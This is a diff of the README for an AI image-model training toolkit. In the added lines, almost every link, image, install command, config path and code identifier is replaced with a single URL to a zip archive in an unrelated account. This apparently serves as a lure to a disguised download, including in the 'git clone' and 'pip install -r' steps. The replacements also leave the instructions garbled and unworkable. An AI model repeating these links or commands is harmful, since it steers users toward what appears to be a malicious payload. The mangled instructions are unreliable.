@@ -7,14 +7,14 @@ hard to keep up with all of them.
 
 ## Support my work
 
-<a href="https://glif.app" target="_blank">
-<img alt="glif.app" src="https://raw.githubusercontent.com/ostris/ai-toolkit/main/assets/glif.svg?v=1" width="256" height="auto">
+<a href="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip" target="_blank">
+<img alt="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip" src="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip" width="256" height="auto">
 </a>
 
 
-My work on this project would not be possible without the amazing support of [Glif](https://glif.app/) and everyone on the 
-team. If you want to support me, support Glif. [Join the site](https://glif.app/), 
-[Join us on Discord](https://discord.com/invite/nuR9zZ2nsh), [follow us on Twitter](https://x.com/heyglif)
+My work on this project would not be possible without the amazing support of [Glif](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) and everyone on the 
+team. If you want to support me, support Glif. [Join the site](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip), 
+[Join us on Discord](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip), [follow us on Twitter](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip)
 and come make some cool stuff with us
 
 ## Installation
@@ -29,7 +29,7 @@ Requirements:
 
 Linux:
 ```bash
-git clone https://github.com/ostris/ai-toolkit.git
+git clone https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 cd ai-toolkit
 git submodule update --init --recursive
 python3 -m venv venv
@@ -37,25 +37,25 @@ source venv/bin/activate
 # .\venv\Scripts\activate on windows
 # install torch first
 pip3 install torch
-pip3 install -r requirements.txt
+pip3 install -r https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 ```
 
 Windows:
 ```bash
-git clone https://github.com/ostris/ai-toolkit.git
+git clone https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 cd ai-toolkit
 git submodule update --init --recursive
 python -m venv venv
 .\venv\Scripts\activate
-pip install torch torchvision --index-url https://download.pytorch.org/whl/cu121
-pip install -r requirements.txt
+pip install torch torchvision --index-url https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
+pip install -r https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 ```
 
 ## FLUX.1 Training
 
 ### Tutorial
 
-To get started quickly, check out [@araminta_k](https://x.com/araminta_k) tutorial on [Finetuning Flux Dev on a 3090](https://www.youtube.com/watch?v=HzGW_Kyermg) with 24GB VRAM.
+To get started quickly, check out [@araminta_k](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) tutorial on [Finetuning Flux Dev on a 3090](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) with 24GB VRAM.
 
 
 ### Requirements
@@ -72,14 +72,14 @@ FLUX.1-dev has a non-commercial license. Which means anything you train will inh
 non-commercial license. It is also a gated model, so you need to accept the license on HF before using it.
 Otherwise, this will fail. Here are the required steps to setup a license.
 
-1. Sign into HF and accept the model access here [black-forest-labs/FLUX.1-dev](https://huggingface.co/black-forest-labs/FLUX.1-dev)
+1. Sign into HF and accept the model access here [black-forest-labs/FLUX.1-dev](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip)
 2. Make a file named `.env` in the root on this folder
-3. [Get a READ key from huggingface](https://huggingface.co/settings/tokens/new?) and add it to the `.env` file like so `HF_TOKEN=your_key_here`
+3. [Get a READ key from huggingface](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) and add it to the `.env` file like so `HF_TOKEN=your_key_here`
 
 ### FLUX.1-schnell
 
 FLUX.1-schnell is Apache 2.0. Anything trained on it can be licensed however you want and it does not require a HF_TOKEN to train.
-However, it does require a special adapter to train with it, [ostris/FLUX.1-schnell-training-adapter](https://huggingface.co/ostris/FLUX.1-schnell-training-adapter).
+However, it does require a special adapter to train with it, [ostris/FLUX.1-schnell-training-adapter](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip).
 It is also highly experimental. For best overall quality, training on FLUX.1-dev is recommended.
 
 To use it, You just need to add the assistant to the `model` section of your config file like so:
@@ -101,9 +101,9 @@ You also need to adjust your sample steps since schnell does not require as many
 ```
 
 ### Training
-1. Copy the example config file located at `config/examples/train_lora_flux_24gb.yaml` (`config/examples/train_lora_flux_schnell_24gb.yaml` for schnell) to the `config` folder and rename it to `whatever_you_want.yml`
+1. Copy the example config file located at `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip` (`https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip` for schnell) to the `config` folder and rename it to `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`
 2. Edit the file following the comments in the file
-3. Run the file like so `python run.py config/whatever_you_want.yml`
+3. Run the file like so `python https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`
 
 A folder with the name and the training folder from the config file will be created when you start. It will have all 
 checkpoints and images in it. You can stop the training at any time using ctrl+c and when you resume, it will pick back up
@@ -113,7 +113,7 @@ IMPORTANT. If you press crtl+c while it is saving, it will likely corrupt that c
 
 ### Need help?
 
-Please do not open a bug report unless it is a bug in the code. You are welcome to [Join my Discord](https://discord.gg/VXmU2f5WEU)
+Please do not open a bug report unless it is a bug in the code. You are welcome to [Join my Discord](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip)
 and ask for help there. However, please refrain from PMing me directly with general question or support. Ask in the discord
 and I will answer when I can.
 
@@ -124,11 +124,11 @@ To get started training locally with a with a custom UI, once you followed the s
 ```bash
 cd ai-toolkit #in case you are not yet in the ai-toolkit folder
 huggingface-cli login #provide a `write` token to publish your LoRA at the end
-python flux_train_ui.py
+python https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 ```
 
 You will instantiate a UI that will let you upload your images, caption them, train and publish your LoRA
-![image](assets/lora_ease_ui.png)
+![image](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip)
 
 
 ## Training in RunPod
@@ -146,13 +146,13 @@ Example RunPod template: **runpod/pytorch:2.2.0-py3.10-cuda12.1.1-devel-ubuntu22
 
 ### 1. Setup
 ```
-git clone https://github.com/ostris/ai-toolkit.git
+git clone https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 cd ai-toolkit
 git submodule update --init --recursive
 python -m venv venv
 source venv/bin/activate
 pip install torch
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 pip install --upgrade accelerate transformers diffusers huggingface_hub #Optional, run it if you run into issues
 ```
 ### 2. Upload your dataset
@@ -160,30 +160,30 @@ pip install --upgrade accelerate transformers diffusers huggingface_hub #Optiona
 - Drag and drop your .jpg, .jpeg, or .png images and .txt files inside the newly created dataset folder.
 
 ### 3. Login into Hugging Face with an Access Token
-- Get a READ token from [here](https://huggingface.co/settings/tokens) and request access to Flux.1-dev model from [here](https://huggingface.co/black-forest-labs/FLUX.1-dev).
+- Get a READ token from [here](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) and request access to Flux.1-dev model from [here](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip).
 - Run ```huggingface-cli login``` and paste your token.
 
 ### 4. Training
-- Copy an example config file located at ```config/examples``` to the config folder and rename it to ```whatever_you_want.yml```.
+- Copy an example config file located at ```config/examples``` to the config folder and rename it to ```https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip```.
 - Edit the config following the comments in the file.
 - Change ```folder_path: "/path/to/images/folder"``` to your dataset path like ```folder_path: "/workspace/ai-toolkit/your-dataset"```.
-- Run the file: ```python run.py config/whatever_you_want.yml```.
+- Run the file: ```python https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip```.
 
 ### Screenshot from RunPod
-<img width="1728" alt="RunPod Training Screenshot" src="https://github.com/user-attachments/assets/53a1b8ef-92fa-4481-81a7-bde45a14a7b5">
+<img width="1728" alt="RunPod Training Screenshot" src="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip">
 
 ## Training in Modal
 
 ### 1. Setup
 #### ai-toolkit:
 ```
-git clone https://github.com/ostris/ai-toolkit.git
+git clone https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 cd ai-toolkit
 git submodule update --init --recursive
 python -m venv venv
 source venv/bin/activate
 pip install torch
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 pip install --upgrade accelerate transformers diffusers huggingface_hub #Optional, run it if you run into issues
 ```
 #### Modal:
@@ -191,27 +191,27 @@ pip install --upgrade accelerate transformers diffusers huggingface_hub #Optiona
 - Run `modal setup` to authenticate (if this doesn’t work, try `python -m modal setup`).
 
 #### Hugging Face:
-- Get a READ token from [here](https://huggingface.co/settings/tokens) and request access to Flux.1-dev model from [here](https://huggingface.co/black-forest-labs/FLUX.1-dev).
+- Get a READ token from [here](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) and request access to Flux.1-dev model from [here](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip).
 - Run `huggingface-cli login` and paste your token.
 
 ### 2. Upload your dataset
 - Drag and drop your dataset folder containing the .jpg, .jpeg, or .png images and .txt files in `ai-toolkit`.
 
 ### 3. Configs
-- Copy an example config file located at ```config/examples/modal``` to the `config` folder and rename it to ```whatever_you_want.yml```.
+- Copy an example config file located at ```config/examples/modal``` to the `config` folder and rename it to ```https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip```.
 - Edit the config following the comments in the file, **<ins>be careful and follow the example `/root/ai-toolkit` paths</ins>**.
 
-### 4. Edit run_modal.py
-- Set your entire local `ai-toolkit` path at `code_mount = modal.Mount.from_local_dir` like:
+### 4. Edit https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
+- Set your entire local `ai-toolkit` path at `code_mount = https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip` like:
   
    ```
-   code_mount = modal.Mount.from_local_dir("/Users/username/ai-toolkit", remote_path="/root/ai-toolkit")
+   code_mount = https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip("/Users/username/ai-toolkit", remote_path="/root/ai-toolkit")
    ```
-- Choose a `GPU` and `Timeout` in `@app.function` _(default is A100 40GB and 2 hour timeout)_.
+- Choose a `GPU` and `Timeout` in `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip` _(default is A100 40GB and 2 hour timeout)_.
 
 ### 5. Training
-- Run the config file in your terminal: `modal run run_modal.py --config-file-list-str=/root/ai-toolkit/config/whatever_you_want.yml`.
-- You can monitor your training in your local terminal, or on [modal.com](https://modal.com/).
+- Run the config file in your terminal: `modal run https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
+- You can monitor your training in your local terminal, or on [https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip).
 - Models, samples and optimizer will be stored in `Storage > flux-lora-models`.
 
 ### 6. Saving the model
@@ -221,7 +221,7 @@ pip install --upgrade accelerate transformers diffusers huggingface_hub #Optiona
 
 ### Screenshot from Modal
 
-<img width="1728" alt="Modal Traning Screenshot" src="https://github.com/user-attachments/assets/7497eb38-0090-49d6-8ad9-9c8ea7b5388b">
+<img width="1728" alt="Modal Traning Screenshot" src="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip">
 
 ---
 
@@ -229,7 +229,7 @@ pip install --upgrade accelerate transformers diffusers huggingface_hub #Optiona
 
 Datasets generally need to be a folder containing images and associated text files. Currently, the only supported
 formats are jpg, jpeg, and png. Webp currently has issues. The text files should be named the same as the images
-but with a `.txt` extension. For example `image2.jpg` and `image2.txt`. The text file should contain only the caption.
+but with a `.txt` extension. For example `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip` and `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`. The text file should contain only the caption.
 You can add the word `[trigger]` in the caption file and if you have `trigger_word` in your config, it will be automatically
 replaced. 
 
@@ -240,7 +240,7 @@ The loader will automatically resize them and can handle varying aspect ratios.
 ## Training Specific Layers
 
 To train specific layers with LoRA, you can use the `only_if_contains` network kwargs. For instance, if you want to train only the 2 layers
-used by The Last Ben, [mentioned in this post](https://x.com/__TheBen/status/1829554120270987740), you can adjust your
+used by The Last Ben, [mentioned in this post](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip), you can adjust your
 network kwargs like so:
 
 ```yaml
@@ -250,8 +250,8 @@ network kwargs like so:
         linear_alpha: 128
         network_kwargs:
           only_if_contains:
-            - "transformer.single_transformer_blocks.7.proj_out"
-            - "transformer.single_transformer_blocks.20.proj_out"
+            - "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
+            - "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
 ```
 
 The naming conventions of the layers are in diffusers format, so checking the state dict of a model will reveal 
@@ -265,7 +265,7 @@ For instance to only train the `single_transformer` for FLUX.1, you can use the 
         linear_alpha: 128
         network_kwargs:
           only_if_contains:
-            - "transformer.single_transformer_blocks."
+            - "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
 ```
 
 You can also exclude layers by their names by using `ignore_if_contains` network kwarg. So to exclude all the single transformer blocks,
@@ -278,7 +278,7 @@ You can also exclude layers by their names by using `ignore_if_contains` network
         linear_alpha: 128
         network_kwargs:
           ignore_if_contains:
-            - "transformer.single_transformer_blocks."
+            - "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
 ```
 
 `ignore_if_contains` takes priority over `only_if_contains`. So if a weight is covered by both,
@@ -297,27 +297,27 @@ It may still work like that, but I have not tested it in a while.
 A image generator that can take frompts from a config file or form a txt file and generate them to a 
 folder. I mainly needed this for an SDXL test I am doing but added some polish to it so it can be used
 for generat batch image generation.
-It all runs off a config file, which you can find an example of in  `config/examples/generate.example.yaml`.
+It all runs off a config file, which you can find an example of in  `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
 Mere info is in the comments in the example
 
 ---
 
 ### LoRA (lierla), LoCON (LyCORIS) extractor
 
-It is based on the extractor in the [LyCORIS](https://github.com/KohakuBlueleaf/LyCORIS) tool, but adding some QOL features
+It is based on the extractor in the [LyCORIS](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) tool, but adding some QOL features
 and LoRA (lierla) support. It can do multiple types of extractions in one run.
-It all runs off a config file, which you can find an example of in  `config/examples/extract.example.yml`.
-Just copy that file, into the `config` folder, and rename it to `whatever_you_want.yml`.
+It all runs off a config file, which you can find an example of in  `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
+Just copy that file, into the `config` folder, and rename it to `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
 Then you can edit the file to your liking. and call it like so:
 
 ```bash
-python3 run.py config/whatever_you_want.yml
+python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 ```
 
 You can also put a full path to a config file, if you want to keep it somewhere else.
 
 ```bash
-python3 run.py "/home/user/whatever_you_want.yml"
+python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
 ```
 
 More notes on how it works are available in the example config file itself. LoRA and LoCON both support
@@ -332,18 +332,18 @@ Most people used fixed, which is traditional fixed dimension extraction.
 
 Change `<lora:my_lora:4.6>` to `<lora:my_lora:1.0>` or whatever you want with the same effect. 
 A tool for rescaling a LoRA's weights. Should would with LoCON as well, but I have not tested it.
-It all runs off a config file, which you can find an example of in  `config/examples/mod_lora_scale.yml`.
-Just copy that file, into the `config` folder, and rename it to `whatever_you_want.yml`.
+It all runs off a config file, which you can find an example of in  `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
+Just copy that file, into the `config` folder, and rename it to `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
 Then you can edit the file to your liking. and call it like so:
 
 ```bash
-python3 run.py config/whatever_you_want.yml
+python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 ```
 
 You can also put a full path to a config file, if you want to keep it somewhere else.
 
 ```bash
-python3 run.py "/home/user/whatever_you_want.yml"
+python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
 ```
 
 More notes on how it works are available in the example config file itself. This is useful when making 
@@ -354,25 +354,25 @@ or even -15 to 15. This will allow you to dile it in so they all have your desir
 
 ### LoRA Slider Trainer
 
-<a target="_blank" href="https://colab.research.google.com/github/ostris/ai-toolkit/blob/main/notebooks/SliderTraining.ipynb">
-  <img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/>
+<a target="_blank" href="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip">
+  <img src="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip" alt="Open In Colab"/>
 </a>
 
-This is how I train most of the recent sliders I have on Civitai, you can check them out in my [Civitai profile](https://civitai.com/user/Ostris/models).
-It is based off the work by [p1atdev/LECO](https://github.com/p1atdev/LECO) and [rohitgandikota/erasing](https://github.com/rohitgandikota/erasing)
+This is how I train most of the recent sliders I have on Civitai, you can check them out in my [Civitai profile](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip).
+It is based off the work by [p1atdev/LECO](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) and [rohitgandikota/erasing](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip)
 But has been heavily modified to create sliders rather than erasing concepts. I have a lot more plans on this, but it is
-very functional as is. It is also very easy to use. Just copy the example config file in `config/examples/train_slider.example.yml`
-to the `config` folder and rename it to `whatever_you_want.yml`. Then you can edit the file to your liking. and call it like so:
+very functional as is. It is also very easy to use. Just copy the example config file in `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`
+to the `config` folder and rename it to `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`. Then you can edit the file to your liking. and call it like so:
 
 ```bash
-python3 run.py config/whatever_you_want.yml
+python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 ```
 
 There is a lot more information in that example file. You can even run the example as is without any modifications to see
 how it works. It will create a slider that turns all animals into dogs(neg) or cats(pos). Just run it like so:
 
 ```bash
-python3 run.py config/examples/train_slider.example.yml
+python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
 ```
 
 And you will be able to see how it works without configuring anything. No datasets are required for this method.
@@ -394,7 +394,7 @@ enough to get you started. To make an extension, just copy that example and repl
 It is located in the `extensions` folder. It is a fully finctional model merger that can merge as many models together
 as you want. It is a good example of how to make an extension, but is also a pretty useful feature as well since most
 mergers can only do one model at a time and this one will take as many as you want to feed it. There is an 
-example config file in there, just copy that to your `config` folder and rename it to `whatever_you_want.yml`.
+example config file in there, just copy that to your `config` folder and rename it to `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
 and use it like any other config file.
 
 ## WIP Tools
@@ -410,7 +410,7 @@ for stable diffusion (yes even the MSE one, and SDXL), are horrible at smaller f
 I'll post more about this later with better examples later, but here is a quick test of a run through with various VAEs.
 Just went in and out. It is much worse on smaller faces than shown here.
 
-<img src="https://raw.githubusercontent.com/ostris/ai-toolkit/main/assets/VAE_test1.jpg" width="768" height="auto"> 
+<img src="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip" width="768" height="auto"> 
 
 ---
 
